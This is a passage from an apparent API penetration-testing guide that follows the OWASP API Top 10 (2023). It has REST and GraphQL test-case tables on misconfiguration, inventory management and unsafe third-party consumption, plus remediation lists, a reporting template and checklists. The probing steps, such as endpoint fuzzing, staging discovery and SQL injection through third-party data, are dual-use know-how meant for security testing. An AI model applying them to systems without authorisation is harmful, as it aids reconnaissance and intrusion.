| CONF-G04 | **Field suggestion exploitation** | 1. Query with typo: `{ userz { name } }`<br>2. Check if error suggests `users`<br>3. Use to enumerate valid fields | Field suggestions disabled | Medium |
| CONF-G05 | **Missing query cost/depth limits** | 1. Verify depth limit configuration<br>2. Check query complexity analysis<br>3. Test if limits are enforced | Limits configured and enforced | High |

### ✅ Remediation
- Implement automated security configuration scanning in CI/CD
- Disable introspection and GraphQL IDEs in production
- Use strict CORS policies with specific origin allowlists
- Remove verbose error details in production
- Enforce TLS for all communications
- Implement proper security headers
- Disable JNDI lookups and template expansion in logging

---

## API9:2023 — Improper Inventory Management

### 📖 Description
This covers risks from running outdated API versions, unpatched endpoints, using deprecated APIs with weaker security, and having unclear data flow documentation with third parties.

**Risk Level:** 🟡 MEDIUM

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| INV-R01 | **Old API version active** | 1. Test `/api/v1/`, `/api/v2/`, `/api/v3/`<br>2. Check if older versions respond<br>3. Test for missing security controls in old versions | Old versions deprecated/removed | High |
| INV-R02 | **Beta/staging endpoints exposed** | 1. Test: `beta.api.target.com`, `staging.api.target.com`<br>2. Test: `/api/beta/`, `/api/staging/`<br>3. Check for weaker security controls | Non-prod not publicly accessible | Critical |
| INV-R03 | **Undocumented endpoints** | 1. Fuzz for common paths: `/api/internal`, `/api/debug`<br>2. Check Swagger/OpenAPI for completeness<br>3. Compare documented vs. discovered endpoints | All endpoints documented & secured | Medium |
| INV-R04 | **Deprecated endpoint with missing auth** | 1. Identify deprecated endpoints<br>2. Test authentication requirements<br>3. Compare security level with current version | Same security level as current | High |
| INV-R05 | **Third-party data flow audit** | 1. Identify all third-party integrations<br>2. Check what data is shared<br>3. Verify data flow documentation | All flows documented & justified | Medium |

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| INV-G01 | **Deprecated fields still accessible** | 1. Introspect for deprecated fields using `isDeprecated`<br>2. Query deprecated fields<br>3. Check if they return data | Deprecated fields removed or blocked | Medium |
| INV-G02 | **Multiple GraphQL endpoints** | 1. Test: `/graphql`, `/graphql/v2`, `/gql`<br>2. Check for different schemas on each<br>3. Compare security enforcement | Single, documented endpoint | High |
| INV-G03 | **Schema versioning gaps** | 1. Compare current schema with previous versions<br>2. Check for types/fields removed from docs but still present<br>3. Test orphaned resolvers | Schema matches documentation | Medium |

### ✅ Remediation
- Maintain a complete API inventory and registry
- Implement API versioning strategy with clear retirement timelines
- Shut down non-production endpoints or restrict access
- Audit all third-party data flows regularly
- Remove deprecated GraphQL fields and types, don't just mark them

---

## API10:2023 — Unsafe Consumption of APIs

### 📖 Description
APIs that consume data from third-party APIs often trust that data more than user input, leading to vulnerabilities when third-party services are compromised or return malicious data.

**Risk Level:** 🟡 MEDIUM

---

### 🧪 Test Cases — REST API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| UCON-R01 | **SQL injection via third-party data** | 1. Identify fields populated from third-party APIs<br>2. If possible, inject SQL payload into third-party data source<br>3. Check if API sanitizes before DB insertion | Input sanitized regardless of source | Critical |
| UCON-R02 | **Blind redirect following** | 1. Identify API calls to third-party services<br>2. Test if 3xx redirects are followed blindly<br>3. Check if sensitive data is sent to redirect target | Redirects validated or disabled | High |
| UCON-R03 | **Unencrypted third-party communication** | 1. Intercept traffic between API and third parties<br>2. Check for HTTP (non-TLS) connections<br>3. Verify certificate validation | All external comms over TLS | High |
| UCON-R04 | **Missing timeout on third-party calls** | 1. If third party is slow/unresponsive<br>2. Check if API hangs indefinitely<br>3. Test for resource exhaustion via slow third party | Timeouts configured | Medium |
| UCON-R05 | **Third-party response size limits** | 1. Check if API limits response size from third parties<br>2. Test with oversized responses<br>3. Monitor memory consumption | Response size limits enforced | Medium |

---

### 🧪 Test Cases — GraphQL API

| **TC #** | **Test Case** | **Steps** | **Expected (Secure)** | **Severity** |
|---|---|---|---|---|
| UCON-G01 | **Federated schema injection** | 1. Identify GraphQL federation/stitching<br>2. Test if external schema can inject malicious types<br>3. Check type conflict resolution | Schema stitching validates sources | High |
| UCON-G02 | **Third-party resolver data injection** | 1. Identify resolvers that fetch from external APIs<br>2. Test if returned data is sanitized<br>3. Check for XSS/injection in resolver output | All resolver data sanitized | High |
| UCON-G03 | **External service timeout in resolvers** | 1. Test resolvers backed by external services<br>2. Check behavior when external service is slow<br>3. Verify timeout configuration | Resolver-level timeouts configured | Medium |

### ✅ Remediation
- Treat all third-party data as untrusted user input
- Validate, sanitize, and escape all data from external APIs
- Use TLS for all external API communications with proper certificate validation
- Implement timeouts and response size limits for all third-party calls
- Don't blindly follow redirects from third-party services
- Maintain an inventory of all third-party API integrations

---

## 15. Reporting Template

### Finding Report Format

For each vulnerability discovered, document using this template:

| **Field** | **Details** |
|---|---|
| **Finding ID** | API-YYYY-NNN |
| **Title** | Descriptive title of the vulnerability |
| **OWASP Category** | API1-API10 reference |
| **API Type** | REST / GraphQL / Both |
| **Severity** | Critical / High / Medium / Low / Informational |
| **CVSS Score** | X.X (Base Score) |
| **Affected Endpoint** | Full URL or GraphQL operation |
| **Description** | Detailed description of the vulnerability |
| **Steps to Reproduce** | Numbered step-by-step reproduction |
| **Proof of Concept** | HTTP request/response or GraphQL query/response |
| **Impact** | Business and technical impact assessment |
| **Remediation** | Specific fix recommendations |
| **References** | OWASP links, CVEs, CWEs |

### Severity Rating Matrix

| **Severity** | **CVSS Range** | **Description** | **SLA** |
|---|---|---|---|
| 🔴 Critical | 9.0 - 10.0 | Full system compromise, mass data breach | 24 hours |
| 🟠 High | 7.0 - 8.9 | Significant data exposure, privilege escalation | 7 days |
| 🟡 Medium | 4.0 - 6.9 | Limited unauthorized access, information leak | 30 days |
| 🟢 Low | 0.1 - 3.9 | Minor information disclosure | 90 days |
| 🔵 Info | 0.0 | Best practice recommendation | Next release |

---

## 16. Appendix — Quick Reference Checklists

### REST API Security Checklist

- [ ] All endpoints require authentication (unless public by design)
- [ ] Authorization checked at object, property, and function level
- [ ] JWT tokens validated (signature, algorithm, expiration, audience)
- [ ] Rate limiting implemented per endpoint
- [ ] Input validation on all parameters (path, query, body, headers)
- [ ] Output filtering — no sensitive data in responses
- [ ] HTTPS enforced with proper TLS configuration
- [ ] CORS policy properly configured
- [ ] Security headers present (HSTS, CSP, X-Content-Type-Options, etc.)
- [ ] Error messages don't expose internal details
- [ ] Pagination enforced with maximum page sizes
- [ ] File upload limits and validation in place
- [ ] API versioning strategy with deprecated versions removed
- [ ] All third-party data treated as untrusted
- [ ] Logging enabled without PII / credentials

### GraphQL API Security Checklist

- [ ] Introspection disabled in production
- [ ] GraphQL IDE (GraphiQL/Playground) disabled in production
- [ ] Query depth limiting configured
- [ ] Query complexity / cost analysis implemented
- [ ] Batch query size limited
- [ ] Alias count per query limited
- [ ] Field-level authorization in resolvers
- [ ] Mutation input validation (no mass assignment)
- [ ] Rate limiting per operation (not just per request)
- [ ] Subscription authentication and authorization
- [ ] Error messages don't suggest field names
- [ ] Deprecated types and fields removed (not just marked)
- [ ] Fragment circular reference protection
- [ ] Persisted queries used where possible
- [ ] Timeout configured for all resolvers

### Tools Quick Reference

| **Task** | **REST Tool** | **GraphQL Tool** |
|---|---|---|
| Intercepting | Burp Suite, ZAP | Burp Suite + InQL Extension |
| Fuzzing | ffuf, wfuzz | BatchQL, graphql-cop |
| Schema Discovery | Swagger UI, OpenAPI | Introspection, GraphQL Voyager |
| Token Analysis | jwt_tool, jwt.io | jwt_tool, jwt.io |
| Scanning | Nuclei, Nikto | graphql-cop, CrackQL |
| Rate Limit Testing | Custom scripts, Turbo Intruder | BatchQL, custom batching scripts |

---

## 📚 References

- [OWASP API Security Top 10 — 2023 Edition](https://owasp.org/API-Security/editions/2023/en/0x00-notice/)
- [OWASP API Security Project](https://owasp.org/www-project-api-security/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [GraphQL Security Best Practices](https://graphql.org/learn/security/)
- [CWE/SANS Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html)
- [NIST SP 800-95 — Guide to Secure Web Services](https://csrc.nist.gov/publications/detail/sp/800-95/final)

---

**Document End**
*Version 1.0 — March 2026*
*Classification: Confidential*
